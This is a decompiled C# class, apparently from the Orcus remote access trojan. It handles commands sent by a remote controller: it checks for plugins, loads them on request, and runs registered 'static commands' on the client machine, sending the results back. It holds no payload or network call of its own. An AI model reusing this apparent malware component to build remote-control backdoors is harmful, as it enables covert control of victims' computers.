using System;
using System.IO;
using System.Linq;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.ClientCommands;
using Orcus.StaticCommandManagement;

namespace Orcus.Commands.ClientCommands;

public class ClientCommandsCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Invalid comparison between Unknown and I4
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		ClientCommandsCommunication val = (ClientCommandsCommunication)parameter[0];
		if ((int)val > 1)
		{
			if ((int)val != 5)
			{
				throw new ArgumentOutOfRangeException();
			}
			bool pluginAvailable = StaticCommandSelector.Current.CheckPluginAvailable(parameter.Skip(1).Take(16).ToArray());
			connectionInfo.UnsafeResponse((Command)(object)this, 18, (Action<BinaryWriter>)delegate(BinaryWriter writer)
			{
				writer.Write((byte)6);
				writer.Write((byte)(pluginAvailable ? 1 : 0));
				writer.Write(parameter, 1, 16);
			});
			return;
		}
		Guid key = new Guid(parameter.Skip(1).Take(16).ToArray());
		byte[] array;
		if (parameter[0] == 1)
		{
			if (!StaticCommandSelector.Current.LoadStaticCommandPlugin(BitConverter.ToInt32(parameter, 33), parameter.Skip(17).Take(16).ToArray()))
			{
				((Command)this).ResponseByte((byte)7, connectionInfo);
				return;
			}
			array = new byte[parameter.Length - 37];
			Array.Copy(parameter, 37, array, 0, array.Length);
		}
		else
		{
			array = new byte[parameter.Length - 17];
			Array.Copy(parameter, 17, array, 0, array.Length);
		}
		ClientCommandsFeedbackFactory clientCommandsFeedbackFactory = new ClientCommandsFeedbackFactory(connectionInfo, (Command)(object)this);
		if (StaticCommandSelector.Current.StaticCommands.TryGetValue(key, out var value))
		{
			try
			{
				value.Execute(new CommandParameter(array), (IFeedbackFactory)(object)clientCommandsFeedbackFactory, connectionInfo.get_ClientInfo());
			}
			catch (Exception ex)
			{
				clientCommandsFeedbackFactory.Failed("Critical error: " + ex.Message);
			}
			clientCommandsFeedbackFactory.Succeeded();
		}
	}

	protected override uint GetId()
	{
		return 31u;
	}
}
